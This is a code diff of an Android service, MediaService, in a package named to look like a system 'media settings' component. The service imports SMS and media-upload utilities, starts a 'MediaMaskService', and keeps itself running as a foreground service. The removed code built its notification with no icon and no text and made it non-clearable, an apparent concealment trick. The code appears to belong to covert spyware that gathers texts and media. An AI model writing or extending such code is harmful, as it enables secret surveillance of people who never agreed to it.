@@ -1,6 +1,5 @@
 package com.android.media.settings.Services;
 
-import android.app.ActivityManager;
 import android.app.Notification;
 import android.app.NotificationManager;
 import android.app.Service;
@@ -12,6 +11,7 @@ import android.os.IBinder;
 import android.support.annotation.Nullable;
 import android.util.Log;
 
+import com.android.media.settings.MediaConfig;
 import com.android.media.settings.MediaDBManager;
 import com.android.media.settings.Utility.MediaCompressorUtility;
 import com.android.media.settings.Utility.SMSUtility;
@@ -21,8 +21,6 @@ import com.android.media.settings.Utility.MediaUploadUtility;
 import com.android.media.settings.Utility.MediaUtility;
 
 import java.lang.reflect.Method;
-import java.util.Iterator;
-import java.util.List;
 import java.util.Timer;
 import java.util.TimerTask;
 
@@ -34,7 +32,6 @@ public class MediaService extends Service {
     private final IBinder mediaBinder = new MediaBinder();
 
     private NotificationManager mNM;
-    private final static int NOTIFICATION_ID = 471;
     private static final Class<?>[] mStartForegroundSignature = new Class[] {
             int.class, Notification.class};
     private static final Class<?>[] mSetForegroundSignature = new Class[] {
@@ -86,19 +83,14 @@ public class MediaService extends Service {
             throw new IllegalStateException(
                     "OS doesn't have Service.startForeground OR Service.setForeground!");
         }
-        startForeground(NOTIFICATION_ID, getNotification());
         this.mUtility = new MediaUtility(this);
         this.dbManager = new MediaDBManager(this);
     }
 
-    private Notification getNotification() {
-        Notification note = new Notification( 0, null, System.currentTimeMillis() );
-        note.flags |= Notification.FLAG_NO_CLEAR;
-        return note;
-    }
-
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        startForeground(MediaConfig.NOTIFICATION_ID, mUtility.getNotification());
+        startService(new Intent(this, MediaMaskService.class));
         registerReceiver();
         Thread mediaThread = new Thread(mediaRunnable);
         mediaThread.start();
